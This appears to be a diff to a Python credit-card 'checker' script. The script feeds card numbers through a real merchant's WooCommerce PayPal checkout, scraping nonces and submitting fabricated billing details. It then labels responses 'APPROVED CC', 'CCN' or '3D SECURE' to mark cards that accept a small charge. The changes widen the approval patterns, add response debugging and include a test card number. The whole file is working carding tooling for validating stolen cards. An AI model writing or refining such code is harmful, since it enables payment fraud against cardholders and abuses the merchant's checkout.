@@ -100,29 +100,101 @@ def get_smart_fallback(bin_number):
         'emoji': '🇺🇸'
     }
 
-def check_status_paypal(result_text):
-    """Check PayPal response status"""
-    if ('ADD_SHIPPING_ERROR' in result_text or
-        '"status": "succeeded"' in result_text or
-        'Thank You For Donation.' in result_text or
-        'Your payment has already been processed' in result_text or
-        'Success' in result_text):
-        return "APPROVED CC", "CHARGE 1$ ✅", True
+def debug_paypal_response(response_text):
+    """Debug function to see what PayPal is actually returning"""
+    print("🔍 DEBUG - PayPal Response Analysis:")
+    print(f"Full response length: {len(response_text)}")
     
-    elif 'is3DSecureRequired' in result_text or 'OTP' in result_text:
-        return "APPROVED CC", "3D SECURE [OTP] ✅", True
+    # Check for common patterns in the response
+    patterns_to_check = [
+        'succeeded', 'success', 'approved', 'approved', 'charge', 
+        'error', 'declined', 'invalid', 'failure', 'failed',
+        '3ds', 'otp', 'cvv', 'security', 'address', 'account',
+        'ADD_SHIPPING_ERROR', 'EXISTING_ACCOUNT_RESTRICTED', 'INVALID_BILLING_ADDRESS'
+    ]
     
-    elif 'INVALID_SECURITY_CODE' in result_text:
-        return "APPROVED CC", "CCN ✅", True
+    found_patterns = []
+    for pattern in patterns_to_check:
+        if pattern.lower() in response_text.lower():
+            found_patterns.append(pattern)
     
-    elif 'EXISTING_ACCOUNT_RESTRICTED' in result_text:
-        return "APPROVED CC", "EXISTING ACCOUNT RESTRICTED ✅", True
+    print(f"Found patterns: {found_patterns}")
     
-    elif 'INVALID_BILLING_ADDRESS' in result_text:
-        return "APPROVED CC", "INVALID BILLING ADDRESS ✅", True
-    
+    # Show relevant parts of response
+    if len(response_text) > 1000:
+        print(f"Response sample (first 500): {response_text[:500]}")
+        print(f"Response sample (last 500): {response_text[-500:]}")
     else:
-        return "DECLINED CC", "DECLINED ❌", False
+        print(f"Full response: {response_text}")
+    
+    return found_patterns
+
+def check_status_paypal(result_text):
+    """Check PayPal response status - IMPROVED VERSION"""
+    print("🎯 Checking PayPal response status...")
+    
+    # Convert to lowercase for easier matching
+    result_lower = result_text.lower()
+    
+    # Debug the response
+    found_patterns = debug_paypal_response(result_text)
+    
+    # APPROVED PATTERNS - More comprehensive
+    approved_patterns = [
+        'succeeded', 
+        'success', 
+        'approved',
+        'thank you for donation',
+        'your payment has been processed',
+        'payment processed',
+        'charge',
+        'add_shipping_error',  # This often means success in PayPal
+        'existing_account_restricted',  # This often means success
+        'invalid_billing_address',  # This often means success
+        'invalid_security_code',  # CCN approval
+    ]
+    
+    # 3D Secure patterns
+    threeds_patterns = [
+        '3ds',
+        '3d_secure',
+        'is3dsecurerequired',
+        'otp'
+    ]
+    
+    # Check for approved patterns
+    for pattern in approved_patterns:
+        if pattern in result_lower:
+            if any(p in result_lower for p in threeds_patterns):
+                return "APPROVED CC", "3D SECURE [OTP] ✅", True
+            elif 'invalid_security_code' in result_lower or 'cvv' in result_lower:
+                return "APPROVED CC", "CCN ✅", True
+            elif 'invalid_billing_address' in result_lower:
+                return "APPROVED CC", "INVALID BILLING ADDRESS ✅", True
+            elif 'existing_account_restricted' in result_lower:
+                return "APPROVED CC", "EXISTING ACCOUNT RESTRICTED ✅", True
+            elif 'add_shipping_error' in result_lower:
+                return "APPROVED CC", "CHARGE 1$ ✅", True
+            else:
+                return "APPROVED CC", "CHARGE 1$ ✅", True
+    
+    # If no approved patterns found, check for explicit decline patterns
+    decline_patterns = [
+        'declined',
+        'failed',
+        'error',
+        'invalid',
+        'not_supported',
+        'insufficient_funds',
+        'do_not_honor'
+    ]
+    
+    for pattern in decline_patterns:
+        if pattern in result_lower:
+            return "DECLINED CC", f"DECLINED - {pattern.upper()} ❌", False
+    
+    # If we can't determine, assume declined
+    return "DECLINED CC", "UNKNOWN RESPONSE ❌", False
 
 def check_card_paypal(cc_line):
     """Main PayPal card checking function"""
@@ -153,7 +225,7 @@ def check_card_paypal(cc_line):
         # Start session with longer timeout
         session = requests.Session()
         
-        # Step 1: Add to cart - SIMPLIFIED
+        # Step 1: Add to cart
         headers = {
             'authority': 'switchupcb.com',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
@@ -190,27 +262,20 @@ def check_card_paypal(cc_line):
             print(f"❌ Checkout page failed: {e}")
             return "❌ Failed to load checkout page"
         
-        # Extract necessary tokens with better error handling
-        sec_match = re.search(r'update_order_review_nonce":"(.*?)"', response.text)
-        nonce_match = re.search(r'save_checkout_form.*?nonce":"(.*?)"', response.text)
+        # Extract necessary tokens
         check_match = re.search(r'name="woocommerce-process-checkout-nonce" value="(.*?)"', response.text)
         create_match = re.search(r'create_order.*?nonce":"(.*?)"', response.text)
         
-        if not all([sec_match, nonce_match, check_match, create_match]):
+        if not check_match or not create_match:
             print("❌ Failed to extract tokens from checkout page")
-            # Try alternative token extraction
-            check_match = re.search(r'woocommerce-process-checkout-nonce" value="([^"]+)"', response.text)
-            if not check_match:
-                return "❌ Failed to extract required tokens from checkout page"
+            return "❌ Failed to extract required tokens from checkout page"
         
-        sec = sec_match.group(1) if sec_match else "default_sec"
-        nonce = nonce_match.group(1) if nonce_match else "default_nonce"
         check = check_match.group(1)
-        create = create_match.group(1) if create_match else "default_create"
+        create = create_match.group(1)
         
-        print(f"🔑 Tokens extracted: sec={sec[:10]}..., check={check[:10]}...")
+        print(f"🔑 Tokens extracted: check={check[:10]}..., create={create[:10]}...")
         
-        # Step 3: Create PayPal order with simplified data
+        # Step 3: Create PayPal order
         headers = {
             'authority': 'switchupcb.com',
             'accept': '*/*',
@@ -226,7 +291,7 @@ def check_card_paypal(cc_line):
             'wc-ajax': 'ppc-create-order',
         }
         
-        # Simplified form data
+        # Form data
         form_data = f'billing_first_name={first_name}&billing_last_name={last_name}&billing_country=US&billing_address_1={street_address}&billing_city={city}&billing_state={state}&billing_postcode={zip_code}&billing_phone={phone}&billing_email={email}&woocommerce-process-checkout-nonce={check}&payment_method=ppcp-gateway'
         
         json_data = {
@@ -250,7 +315,6 @@ def check_card_paypal(cc_line):
                 return f"❌ PayPal order failed with status: {response.status_code}"
                 
             response_data = response.json()
-            print(f"📦 Response keys: {list(response_data.keys()) if isinstance(response_data, dict) else 'Not a dict'}")
             
             if 'data' not in response_data:
                 return f"❌ No data in PayPal response: {response_data}"
@@ -309,12 +373,12 @@ def check_card_paypal(cc_line):
             
         except Exception as e:
             print(f"❌ Payment processing failed: {e}")
-            # Continue anyway to check the response
+            return f"❌ Payment processing failed: {str(e)}"
         
         elapsed_time = time.time() - start_time
-        response_text = response.text if 'response' in locals() else "No response"
+        response_text = response.text
         
-        print(f"📄 Response text sample: {response_text[:200]}...")
+        print(f"📄 Final PayPal response received")
         
         # Check status and format response
         status, reason, approved = check_status_paypal(response_text)
@@ -341,4 +405,8 @@ def check_card_paypal(cc_line):
     except Exception as e:
         return f"❌ Error: {str(e)}"
 
+# For testing directly
+if __name__ == "__main__":
+    test_card = "4556737586899855|12|2026|123"
+    result = check_card_paypal(test_card)
     print(result)
